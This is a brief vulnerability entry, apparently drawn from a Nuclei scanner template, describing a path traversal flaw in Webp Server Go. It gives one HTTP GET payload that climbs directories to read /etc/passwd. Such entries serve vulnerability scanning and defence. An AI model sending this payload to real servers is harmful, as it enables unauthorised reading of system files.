# Vulnerability: Webp Server Go - Path Traversal
**Classification:** WEBP
**Source:** Nuclei Template (`webp-server-lfi.yaml`)

## Description
Webp Server Go has an Path Traversal vulnerability. Attackers can use the vulnerability to access arbitraty file.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/../../../../../../../../../../../etc/passwd
```

